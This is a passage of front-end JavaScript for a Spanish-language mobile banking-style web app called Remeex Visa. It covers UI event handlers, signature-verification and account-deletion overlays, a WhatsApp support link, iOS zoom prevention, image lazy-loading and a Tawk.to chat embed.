    $('#btnDelete')?.addEventListener('click', () => {
      deletionManager.showModal();
    });

    // Cerrar wizard
    $$('#wizardClose, #cancelWizard').forEach(btn => {
      btn?.addEventListener('click', () => {
        overlayManager.hide('wizardOverlay');
      });
    });

    // Cerrar firma
    $('#signatureClose')?.addEventListener('click', () => {
      overlayManager.hide('signatureOverlay');
    });

    // Gestión eliminación
    $('#cancelDeletion')?.addEventListener('click', () => {
      overlayManager.hide('deletionOverlay');
    });

    $('#proceedDeletion')?.addEventListener('click', () => {
      deletionManager.setStep(2);
    });

    $('#backDeletion')?.addEventListener('click', () => {
      deletionManager.setStep(1);
    });

    $('#confirmDeletion')?.addEventListener('click', () => {
      deletionManager.startDeletion();
    });

    $('#deletionClose')?.addEventListener('click', () => {
      overlayManager.hide('deletionOverlay');
    });

    // Análisis de firma
    $('#retryIdUpload')?.addEventListener('click', () => {
      overlayManager.hide('signatureAnalysis');
      analysisManager.cleanup();
      overlayManager.show('wizardOverlay');
      wizardManager.setStep(1);
    });

    $('#contactSupport')?.addEventListener('click', () => {
      const supportMsg = 'Hola, necesito asistencia con la verificación de mi firma. El sistema indicó que no coincide con mi cédula.';
      const supportUrl = `https://wa.me/${CONFIG.phoneNumber}?text=${encodeURIComponent(supportMsg)}`;
      window.open(supportUrl, '_blank', 'noopener,noreferrer');
      overlayManager.hide('signatureAnalysis');
      analysisManager.cleanup();
    });

    $('#analysisCloseBtn')?.addEventListener('click', () => {
      overlayManager.hide('signatureAnalysis');
      analysisManager.cleanup();
    });

    // Notificación suspensión
    $$('#suspensionDismiss, #suspensionContinue').forEach(btn => {
      btn?.addEventListener('click', () => {
        suspensionManager.hide();
      });
    });

    // === PREVENCIÓN DE ZOOM EN IOS ===
    document.addEventListener('touchstart', function(e) {
      if (e.touches.length > 1) {
        e.preventDefault();
      }
    }, { passive: false });

    let lastTouchEnd = 0;
    document.addEventListener('touchend', function(e) {
      const now = (new Date()).getTime();
      if (now - lastTouchEnd <= 300) {
        e.preventDefault();
      }
      lastTouchEnd = now;
    }, false);

    // === OPTIMIZACIÓN DE RENDIMIENTO ===
    
    // Lazy loading de imágenes
    if ('IntersectionObserver' in window) {
      const imageObserver = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
          if (entry.isIntersecting) {
            const img = entry.target;
            if (img.dataset.src) {
              img.src = img.dataset.src;
              img.removeAttribute('data-src');
              imageObserver.unobserve(img);
            }
          }
        });
      });

      $$('img[data-src]').forEach(img => imageObserver.observe(img));
    }

    // Service Worker para cache (opcional)
    if ('serviceWorker' in navigator && window.location.protocol === 'https:') {
      navigator.serviceWorker.register('/sw.js').catch(() => {});
    }

    // === DEBUG (solo en desarrollo) ===
    if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
      window.remeexDebug = {
        balanceManager,
        overlayManager,
        wizardManager,
        stateManager,
        signatureManager,
        analysisManager,
        deletionManager,
        suspensionManager
      };
    }

    // === CLEANUP AL CERRAR PÁGINA ===
    window.addEventListener('beforeunload', () => {
      analysisManager.cleanup();
      deletionManager.cleanup();
    });

    console.log('🎯 Remeex Visa Mobile App iniciada correctamente');

    // === INTEGRACIÓN TAWK.TO ===
    var Tawk_API = Tawk_API || {};
    var Tawk_LoadStart = new Date();
    (function(){
      var s1 = document.createElement("script");
      var s0 = document.getElementsByTagName("script")[0];
      s1.async = true;
      s1.src = 'https://embed.tawk.to/68a44855d541a4192285c373/1j30rl42b';
      s1.charset = 'UTF-8';
      s1.setAttribute('crossorigin','*');
      s0.parentNode.insertBefore(s1,s0);
    })();

})();
